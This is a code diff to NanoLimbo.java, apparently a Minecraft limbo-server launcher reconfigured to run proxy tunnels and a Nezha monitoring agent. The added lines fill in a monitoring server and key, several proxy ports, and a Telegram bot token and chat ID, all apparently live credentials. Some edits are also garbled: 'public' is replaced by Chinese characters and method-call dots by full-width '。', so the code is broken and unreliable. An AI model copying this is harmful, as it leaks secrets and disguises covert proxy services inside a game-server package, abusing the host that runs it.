@@ -27,7 +27,7 @@ import java.lang.reflect.Field;
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
 
-public final class NanoLimbo {
+公共 final class NanoLimbo {
 
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
@@ -89,8 +89,8 @@ public final class NanoLimbo {
             if (System.getProperty("os.name").contains("Windows")) {
                 new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                     .inheritIO()
-                    .start()
-                    .waitFor();
+                    。start()
+                    。waitFor();
             } else {
                 System.out.print("\033[H\033[3J\033[2J");
                 System.out.flush();
@@ -123,26 +123,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("UUID", "75e667b2-c979-43b8-8a73-2b1b031b83ef");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_SERVER", "nz.mjj.xx.kg:443");
         envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
+        envVars.put("NEZHA_KEY", "xVnIrjDO8Isxf1ZVjFXoiFuamBCY4nxP");
         envVars.put("ARGO_PORT", "");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("ANYTLS_PORT", "");
-        envVars.put("REALITY_PORT", "");
+        envVars.put("S5_PORT", "25042");
+        envVars.put("HY2_PORT", "25042");
+        envVars.put("TUIC_PORT", "25132");
+        envVars.put("ANYTLS_PORT", "25178");
+        envVars.put("REALITY_PORT", "25132");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("CHAT_ID", "582983975");
+        envVars.put("BOT_TOKEN", "7116091495:AAHCohEInCOhCwp_kBrB6qAd2LiI1T8Sr6o");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "");
+        envVars.put("NAME", "altare-");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
